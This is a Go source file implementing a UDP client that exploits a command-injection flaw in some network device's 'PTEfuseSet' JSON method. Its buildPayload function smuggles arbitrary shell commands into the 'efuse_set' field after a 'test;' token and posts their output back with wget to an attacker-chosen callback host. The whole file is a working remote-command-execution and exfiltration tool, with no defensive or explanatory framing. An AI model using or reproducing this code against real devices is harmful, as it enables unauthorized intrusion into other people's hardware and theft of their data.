package main

import (
	"encoding/json"
	"errors"
	"fmt"
	"log"
	"net"
	"strings"
	"sync"
	"time"
)

// Sender holds a single persistent UDP connection to the target device and
// wraps shell commands into the PTEfuseSet JSON payload. Every request sent
// and every response received is logged.
type Sender struct {
	mu        sync.Mutex
	conn      *net.UDPConn
	addr      *net.UDPAddr
	device    string
	port      int
	advertise string // host:port the device can reach (for the wget callback)
	status    string // "disconnected" | "connecting" | "connected"
	readerDone chan struct{}
}

func NewSender(device string, port int, advertise string) *Sender {
	return &Sender{
		device:    device,
		port:      port,
		advertise: advertise,
		status:    "disconnected",
	}
}

// Status returns the current connection status.
func (s *Sender) Status() string {
	s.mu.Lock()
	defer s.mu.Unlock()
	return s.status
}

// Target returns the currently configured device address as "host:port".
func (s *Sender) Target() string {
	s.mu.Lock()
	defer s.mu.Unlock()
	return fmt.Sprintf("%s:%d", s.device, s.port)
}

func (s *Sender) setStatus(st string) {
	s.mu.Lock()
	s.status = st
	s.mu.Unlock()
}

// SetTarget changes the device address/port and tears down any existing
// connection so the next command reconnects to the new target.
func (s *Sender) SetTarget(device string, port int) {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.device = device
	s.port = port
	if s.conn != nil {
		s.conn.Close()
		s.conn = nil
	}
	s.status = "disconnected"
}

// Disconnect closes the UDP connection and marks the sender disconnected.
func (s *Sender) Disconnect() {
	s.mu.Lock()
	defer s.mu.Unlock()
	if s.conn != nil {
		s.conn.Close()
		s.conn = nil
	}
	s.status = "disconnected"
}

// Connect probes the device by sending "123" on a short-lived socket and
// waiting for a reply that contains "format failed". On success it opens the
// persistent command connection. Using a separate probe socket avoids racing
// the background reader goroutine over the shared command socket.
func (s *Sender) Connect() bool {
	s.mu.Lock()
	defer s.mu.Unlock()
	if s.conn != nil {
		return s.status == "connected"
	}
	s.status = "connecting"

	addr, err := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", s.device, s.port))
	if err != nil {
		log.Printf("connect: resolve %s:%d: %v", s.device, s.port, err)
		s.status = "disconnected"
		return false
	}

	probe, err := net.DialUDP("udp", nil, addr)
	if err != nil {
		log.Printf("connect: open probe udp: %v", err)
		s.status = "disconnected"
		return false
	}
	defer probe.Close()

	log.Printf("udp  -> %s:%d  \"123\"", s.device, s.port)
	if _, err := probe.Write([]byte("123")); err != nil {
		log.Printf("connect: write probe: %v", err)
		s.status = "disconnected"
		return false
	}
	probe.SetReadDeadline(time.Now().Add(3 * time.Second))
	buf := make([]byte, 4096)
	ok := false
	for {
		n, err := probe.Read(buf)
		if err != nil {
			log.Printf("udp   <- %s:%d  (no reply: %v)", s.device, s.port, err)
			break
		}
		resp := string(buf[:n])
		log.Printf("udp   <- %s:%d  %q", s.device, s.port, resp)
		if strings.Contains(resp, "format failed") {
			ok = true
			break
		}
	}

	if !ok {
		s.status = "disconnected"
		return false
	}

	if err := s.openConnUnlocked(); err != nil {
		log.Printf("connect: open command udp: %v", err)
		s.status = "disconnected"
		return false
	}
	s.status = "connected"
	return true
}

func (s *Sender) openConnUnlocked() error {
	if s.conn != nil {
		return nil
	}
	addr, err := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", s.device, s.port))
	if err != nil {
		return err
	}
	conn, err := net.DialUDP("udp", nil, addr)
	if err != nil {
		return err
	}
	s.conn = conn
	s.addr = addr
	s.startReader()
	return nil
}

// startReader launches a background goroutine that logs every datagram the
// device sends back. It runs until the connection is closed.
func (s *Sender) startReader() {
	done := make(chan struct{})
	s.readerDone = done
	go func() {
		defer close(done)
		buf := make([]byte, 65536)
		for {
			n, err := s.conn.Read(buf)
			if err != nil {
				// A closed socket (Disconnect/SetTarget) is expected; any other
				// error is surfaced for debugging.
				var ne net.Error
				if errors.As(err, &ne) && ne.Timeout() {
					log.Printf("udp reader %s:%d: timeout", s.device, s.port)
					return
				}
				if strings.Contains(err.Error(), "closed") {
					return
				}
				log.Printf("udp reader %s:%d: %v", s.device, s.port, err)
				return
			}
			resp := string(buf[:n])
			log.Printf("udp   <- %s:%d  %q", s.device, s.port, resp)
		}
	}()
}

// Send wraps cmd in the wget callback payload and sends it as one UDP datagram.
func (s *Sender) Send(cmd string) error {
	s.mu.Lock()
	defer s.mu.Unlock()
	if err := s.openConnUnlocked(); err != nil {
		log.Printf("send: open udp %s:%d: %v", s.device, s.port, err)
		s.status = "disconnected"
		return err
	}
	payload := buildPayload(cmd, s.advertise)
	log.Printf("udp  -> %s:%d  %s", s.device, s.port, payload)
	if _, err := s.conn.Write([]byte(payload)); err != nil {
		log.Printf("send: write: %v", err)
		s.status = "disconnected"
		return err
	}
	if s.status != "connected" {
		s.status = "connected"
	}
	return nil
}

// buildPayload produces the exact JSON sent to the device. The shell command
// is wrapped so its output is POSTed back to advertise via wget. The leading
// "test;" token is required for the device to execute the injected shell.
func buildPayload(cmd, advertise string) string {
	efuse := fmt.Sprintf("test;O=$(%s);wget -q --post-data=\"$O\" http://%s/;", cmd, advertise)
	obj := map[string]interface{}{
		"method": "PTEfuseSet",
		"param":  map[string]string{"efuse_set": efuse},
		"result": "failure",
	}
	b, _ := json.Marshal(obj)
	return string(b)
}
